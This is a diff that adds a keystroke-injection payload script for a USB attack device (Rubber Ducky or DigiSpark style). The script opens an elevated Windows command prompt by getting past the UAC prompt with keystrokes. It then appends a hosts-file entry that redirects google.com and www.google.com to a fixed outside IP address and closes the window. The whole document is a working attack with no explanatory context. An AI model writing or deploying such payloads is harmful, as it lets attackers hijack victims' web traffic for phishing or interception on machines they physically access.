@@ -1,0 +1,15 @@
+GUI r
+DELAY 400
+STRING cmd
+DELAY 700
+REM DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT);
+DELAY 1500
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 700
+STRING echo 82.213.238.191 google.com www.google.com >> C:/Windows/System32/drivers/etc/hosts
+DELAY 400
+ENTER
+DELAY 400
+ALT F4
